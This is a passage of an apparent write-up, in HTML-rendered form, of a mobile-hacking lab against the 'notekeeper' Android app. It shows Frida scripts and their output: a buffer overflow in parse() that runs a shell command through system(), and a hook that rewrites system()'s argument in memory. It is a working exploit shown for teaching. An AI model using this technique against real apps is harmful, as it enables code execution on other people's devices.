+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-16">16</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-17">17</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-18">18</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-19">19</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-11-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-11-20">20</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS E:\Desktop\Android\frida-script&gt; frida -U -N com.mobilehackinglab.notekeeper -l a.js
+</span></span><span style="display:flex;"><span>     ____
+</span></span><span style="display:flex;"><span>    / _  |   Frida <span style="color:#ae81ff">16.5</span>.9 - A world-class dynamic instrumentation toolkit
+</span></span><span style="display:flex;"><span>   | (_| |
+</span></span><span style="display:flex;"><span>    &gt; _  |   Commands<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>   /_/ |_|       help      -&gt; Displays the help system
+</span></span><span style="display:flex;"><span>   . . . .       object?   -&gt; Display information about <span style="color:#e6db74">&#39;object&#39;</span>
+</span></span><span style="display:flex;"><span>   . . . .       exit/quit -&gt; Exit
+</span></span><span style="display:flex;"><span>   . . . .
+</span></span><span style="display:flex;"><span>   . . . .   More info at https<span style="color:#960050;background-color:#1e0010">:</span>//frida.re/docs/home/
+</span></span><span style="display:flex;"><span>   . . . .
+</span></span><span style="display:flex;"><span>   . . . .   Connected to POCOPHONE F1 (id=d211a91c)
+</span></span><span style="display:flex;"><span>[POCOPHONE F1::com.mobilehackinglab.notekeeper ]-&gt; MainActivity.parse is called<span style="color:#960050;background-color:#1e0010">:</span> Title=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAid &gt;&gt; /sdcard/Download/hack.txt
+</span></span><span style="display:flex;"><span>[*] system() called with command<span style="color:#960050;background-color:#1e0010">:</span> id &gt;&gt; /sdcard/Download/hack.txt
+</span></span><span style="display:flex;"><span>             <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">9</span>  A  B  C  D  E  F  0123456789ABCDEF
+</span></span><span style="display:flex;"><span>7ff3ad0960  <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">20</span> 3e 3e <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">6f</span>  id &gt;&gt; /sdcard/<span style="color:#66d9ef">Do</span>
+</span></span><span style="display:flex;"><span>7ff3ad0970  <span style="color:#ae81ff">77</span> 6e 6c <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">63</span> 6b 2e <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">00</span>  wnload/hack.txt.
+</span></span><span style="display:flex;"><span>7ff3ad0980  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
+</span></span><span style="display:flex;"><span>[*] system() returned with code<span style="color:#960050;background-color:#1e0010">:</span> 0x0
+</span></span><span style="display:flex;"><span>MainActivity.parse result=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAid &gt;&gt; /sdcard/Download/hack.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I then checked it the POC is created or not.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-12-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-12-1">1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-12-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-12-2">2</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>beryllium:/sdcard/Download <span style="color:#75715e"># cat hack.txt</span>
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>10344<span style="color:#f92672">(</span>u0_a344<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>10344<span style="color:#f92672">(</span>u0_a344<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>10344<span style="color:#f92672">(</span>u0_a344<span style="color:#f92672">)</span>,3003<span style="color:#f92672">(</span>inet<span style="color:#f92672">)</span>,9997<span style="color:#f92672">(</span>everybody<span style="color:#f92672">)</span>,20344<span style="color:#f92672">(</span>u0_a344_cache<span style="color:#f92672">)</span>,50344<span style="color:#f92672">(</span>all_a344<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>u:r:untrusted_app:s0:c88,c257,c512,c768
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I managed to perform RCE by abusing the buffer overflow. Here&rsquo;s a full frida script that I wrote.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-14">14</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-15">15</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-16">16</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-17">17</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-18">18</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-19">19</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-20">20</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-21"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-21">21</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-22"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-22">22</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-23"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-23">23</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-24"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-24">24</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-25"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-25">25</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-26"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-26">26</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-27"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-27">27</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-28"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-28">28</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-29"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-29">29</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-30"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-30">30</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-31"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-31">31</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-13-32"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-13-32">32</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">perform</span>(()=&gt; {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;com.mobilehackinglab.notekeeper.MainActivity&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">MainActivity</span>[<span style="color:#e6db74">&#34;parse&#34;</span>].<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">Title</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;id &gt;&gt; /sdcard/Download/hack.txt&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Title</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span>.<span style="color:#a6e22e">repeat</span>(<span style="color:#ae81ff">100</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">command</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`MainActivity.parse is called: Title=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">Title</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#34;parse&#34;</span>](<span style="color:#a6e22e">Title</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`MainActivity.parse result=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">test1</span>();
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">test1</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Interceptor</span>.<span style="color:#a6e22e">attach</span>(<span style="color:#a6e22e">Module</span>.<span style="color:#a6e22e">getExportByName</span>(<span style="color:#66d9ef">null</span>, <span style="color:#e6db74">&#34;system&#34;</span>), {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">onEnter</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">args</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Memory</span>.<span style="color:#a6e22e">readUtf8String</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] system() called with command: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">command</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">hexdump</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>],{<span style="color:#a6e22e">offset</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>,<span style="color:#a6e22e">length</span><span style="color:#f92672">:</span><span style="color:#ae81ff">48</span>}));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">onLeave</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">retval</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] system() returned with code: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">retval</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Aside from this, I found another method which I could utilize the frida functionality to overwrite the stack / <code>system</code> function input instead of abusing the buffer overflow.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-14">14</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-15">15</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-16">16</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-17">17</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-14-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-14-18">18</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">Interceptor</span>.<span style="color:#a6e22e">attach</span>(<span style="color:#a6e22e">Module</span>.<span style="color:#a6e22e">getExportByName</span>(<span style="color:#66d9ef">null</span>, <span style="color:#e6db74">&#34;system&#34;</span>), {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">onEnter</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">args</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Memory</span>.<span style="color:#a6e22e">readUtf8String</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] system() called with command: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">command</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">hexdump</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>],{<span style="color:#a6e22e">offset</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>,<span style="color:#a6e22e">length</span><span style="color:#f92672">:</span><span style="color:#ae81ff">48</span>}));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">newCommand</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;id &gt;&gt; /sdcard/Download/hack2.txt&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Memory</span>.<span style="color:#a6e22e">writeUtf8String</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>], <span style="color:#a6e22e">newCommand</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+] Replaced with new command:&#34;</span>, <span style="color:#a6e22e">Memory</span>.<span style="color:#a6e22e">readUtf8String</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>]));
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">hexdump</span>(<span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>],{<span style="color:#a6e22e">offset</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>,<span style="color:#a6e22e">length</span><span style="color:#f92672">:</span><span style="color:#ae81ff">48</span>}));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">onLeave</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">retval</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] system() returned with code: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">retval</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>By using this <code>writeUtf8String</code>, I could just rewrite the stack / <code>system</code> function input.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-15-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-15-2"> 2</a>
